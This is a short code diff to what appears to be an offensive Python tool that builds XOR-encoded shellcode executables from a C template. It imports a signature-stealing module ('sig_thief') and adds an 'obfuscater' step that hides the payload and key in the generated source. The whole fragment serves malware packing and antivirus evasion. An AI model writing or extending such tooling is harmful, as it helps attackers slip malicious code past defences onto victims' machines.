@@ -1,5 +1,5 @@
 #!/usr/bin/python3
-from lib import logger, cryptography, utils, sig_thief
+from lib import logger, cryptography, utils, sig_thief, obfuscater
 import argparse, os
 
 parser = argparse.ArgumentParser(description="Build XOR'd shellcode executables.")
@@ -50,8 +50,7 @@ if __name__ == "__main__":
 	logger.msg('Key: ',key,'blue')
 
 	cpp = open('./templates/main.c', "rb").read().decode('utf-8')
-	cpp = cpp.replace('$SHELLCODE$',payload)
-	cpp = cpp.replace('$KEY$',key)
+	cpp = obfuscater.variables(cpp, payload, key)
 
 	if os.system('which %s  > /dev/null 2>&1' % compiler) != 0: 
 		logger.msg('Missing Compiler: ',compiler,'red')
